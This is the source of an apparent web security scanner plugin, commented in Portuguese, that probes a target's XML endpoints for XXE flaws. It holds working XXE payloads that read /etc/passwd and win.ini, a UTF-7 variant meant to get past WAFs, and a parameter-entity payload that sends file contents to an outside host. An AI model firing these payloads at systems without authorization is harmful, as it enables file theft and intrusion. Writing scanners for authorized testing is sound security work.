#!/usr/bin/env python3
"""
XXE Detection (V10.3 Precision) — XML External Entity.
Detecta leitura de arquivos locais e interações OAST com filtros anti-WAF reforçados.
Suporta SOAP (application/soap+xml), error-based, e UTF-7 bypass.
V10.3: httpx.Client reuse, dedup de resultados.
"""
import json
import time
import httpx
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT, get_user_agent
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

XXE_PAYLOADS = [
    # Classic File Read
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "root:"),
    # Error-Based
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://nonexistent-enum-allma.com/xxe.dtd">%remote;]><root>test</root>', "failed to load"),
    # SOAP support
    ('<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>', "root:"),
]

# V10.2: Payloads avançados adicionais
XXE_PAYLOADS_V10_2 = [
    # Error-based via Parameter Entity + invalid file
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent/allma_xxe_check">%xxe;]><foo>test</foo>', "no such file"),
    # UTF-7 encoding bypass (evita WAF que filtra encoding UTF-8)
    ('<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/hostname+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe;+ADw-/foo+AD4-', ""),
    # Windows target check
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', "[fonts]"),
    # Parameter entity exfil via error
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY &#x25; c SYSTEM \'http://nonexistent-enum-allma.com/?x=%a;\'>">%b;%c;]><foo>test</foo>', "root:"),
]

# V10.2: WAF strings reforçados (Cloudflare challenge, generic WAF blocks)
WAF_STRINGS = [
    "cloudflare", "forbidden", "blocked", "access denied", "incident id",
    "just a moment", "checking your browser", "attention required",
    "ddos protection", "sucuri", "akamai", "imperva",
]

def _test_xxe(client: httpx.Client, url: str, oast_url: str = None) -> list:
    """Testa XXE com payloads avançados e filtros cirúrgicos. Reutiliza sessão.
    V10.6: Baseline check para eliminar FPs de páginas que já contêm indicadores."""
    findings = []
    found_urls = set()  # V10.3: Dedup por URL + content-type
    
    # V10.6: Baseline check — buscar quais indicadores já existem no endpoint SEM payload XXE
    baseline_indicators = set()
    benign_xml = '<?xml version="1.0"?><root>test</root>'
    for ctype in ["application/xml", "text/xml", "application/soap+xml"]:
        try:
            baseline_resp = client.post(url, content=benign_xml, headers={"Content-Type": ctype, "User-Agent": DEFAULT_USER_AGENT})
            if baseline_resp.status_code not in [403, 405, 429]:
                bl_body = baseline_resp.text.lower()
                for indicator in ["root:x:", "daemon:", "/bin/bash", "[fonts]", "[extensions]"]:
                    if indicator in bl_body:
                        baseline_indicators.add(indicator)
                break  # Um baseline basta
        except Exception:
            pass
    
    # Combinar payloads V10.1 + V10.2
    payloads = list(XXE_PAYLOADS) + list(XXE_PAYLOADS_V10_2)
    
    # Adicionar payloads OAST se disponível
    if oast_url:
        payloads.append(('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://' + oast_url + '/xxe">]><root>&xxe;</root>', "OAST_MARKER"))
        payloads.append(('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://' + oast_url + '/xxe-param">%xxe;]><foo>test</foo>', "OAST_MARKER"))

    for payload, expected in payloads:
        time.sleep(REQUEST_DELAY)
        try:
            for ctype in ["application/xml", "text/xml", "application/soap+xml"]:
                # V10.3: Dedup por (url, ctype)
                dedup_key = f"{url}|{ctype}"
                if dedup_key in found_urls:
                    continue

                resp = client.post(url, content=payload, headers={"Content-Type": ctype, "User-Agent": DEFAULT_USER_AGENT})
                
                if resp.status_code in [403, 405, 429]:
                    continue
                
                body = resp.text.lower()
                if any(ws in body for ws in WAF_STRINGS):
                    continue

                is_vuln = False
                reason = ""
                risk = "MEDIUM"

                # V10.6: Only flag if indicator NOT in baseline
                if ("root:x:" in body or "daemon:" in body or "/bin/bash" in body) and \
                   not any(ind in baseline_indicators for ind in ["root:x:", "daemon:", "/bin/bash"] if ind in body):
                    is_vuln = True
                    reason = "Indício real de leitura de arquivo (/etc/passwd) detectado no body."
                    risk = "CRITICAL"
                elif ("[fonts]" in body or "[extensions]" in body) and \
                     not any(ind in baseline_indicators for ind in ["[fonts]", "[extensions]"] if ind in body):
                    is_vuln = True
                    reason = "Indício real de leitura de arquivo (win.ini) detectado no body."
                    risk = "CRITICAL"
                elif "no such file" in body and "allma_xxe_check" in body:
                    is_vuln = True
                    reason = "Error-based XXE confirmado: O parser XML avaliou a entity externa (file not found)."
                    risk = "HIGH"
                elif expected != "OAST_MARKER" and expected and expected.lower() in body:
                    is_vuln = True
                    reason = f"Payload avaliado com sucesso (reflexão de {expected})."
                    risk = "HIGH"
                
                if is_vuln:
                    found_urls.add(dedup_key)
                    findings.append({
                        "url": url,
                        "type": "XXE",
                        "risk": risk,
                        "details": reason,
                        "content_type": ctype,
                        "payload": payload,
                        "request_raw": format_http_request(resp.request),
                        "response_raw": format_http_response(resp),
                    })
                    break # Evita duplicar se ambos ctype funcionarem
        except Exception:
            pass
    return findings

def run(context: dict):
    target = context.get("target")
    oast_url = context.get("oast_url")
    stealth = context.get("stealth", False)
    
    if not target:
        raise ValueError("Target required")

    info(f"\n🧪 {C.BOLD}{C.CYAN}XXE SCANNER (V10.3 PRECISION){C.END}")
    outdir = ensure_outdir(target, "xxe")

    # Mapear endpoints XML (heuristic)
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    candidates = []
    if urls_file.exists():
        urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
        # V11: Expandir heurística para capturar mais endpoints que aceitam XML
        candidates = [u for u in urls if any(x in u.lower() for x in [".xml", "/api/", "/graphql", "/soap", "/upload", "/import", "/webhook", "/callback", "/feed", "/rss"])]
    
    # V10.3: Dedup
    candidates = list(set(u.rstrip("/") for u in candidates))[:50]
    # V11: Reduzir workers para thread-safety com httpx.Client compartilhado
    max_workers = 2 if stealth else 5
    
    results = []
    
    # V10.3: Uma única sessão httpx para todos os testes
    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False) as client:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(_test_xxe, client, url, oast_url): url for url in candidates}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    results.extend(res)
                    for f in res:
                        info(f"   🔴 {C.RED}[{f['risk']}]{C.END} XXE detectado em {f['url']}")

    output_file = outdir / "xxe_results.json"
    output_file.write_text(json.dumps(results, indent=2))
    
    # V10.3: Summary
    summary = {"urls_tested": len(candidates), "findings": len(results), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
    
    success(f"   📂 Resultados salvos em {output_file}")
    return results
